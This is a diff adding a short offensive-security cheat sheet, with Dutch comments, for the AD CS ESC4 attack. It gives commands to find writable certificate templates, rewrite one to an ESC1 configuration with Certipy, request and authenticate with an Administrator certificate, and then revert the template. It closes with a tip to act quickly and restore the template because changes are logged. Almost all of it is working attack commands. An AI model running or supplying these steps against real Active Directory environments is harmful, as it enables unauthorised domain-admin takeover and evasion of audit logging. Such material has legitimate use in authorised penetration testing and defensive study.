@@ -1,0 +1,20 @@
+# AD CS ESC4 - Vulnerable Certificate Template Access Control
+# Aanvaller heeft WRITE rechten op een certificate template object in AD
+# Hiermee kan de template aangepast worden naar een ESC1-configuratie
+# Stap 1: Enumerate template ACLs
+.\Certify.exe find /vulnerable
+# Of met PowerView:
+Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite" }
+# Stap 2: Template aanpassen — ENROLLEE_SUPPLIES_SUBJECT aanzetten
+# Met Certipy:
+certipy template -u user@domain.local -p Password123! -template TemplateName -save-old
+# Certipy past automatisch ESC1-configuratie toe en slaat oude config op
+# Stap 3: Nu ESC1 exploiten
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template TemplateName -upn Administrator@domain.local
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# Stap 4: Template terugzetten
+certipy template -u user@domain.local -p Password123! -template TemplateName -configuration TemplateName.json
+# Handmatig via LDAP (StandIn):
+.\StandIn.exe --adcs --filter TemplateName --esc1
+# Tip: Altijd de originele template config opslaan voor rollback
+# Tip: Template wijzigingen worden gelogd — wees snel en zet terug
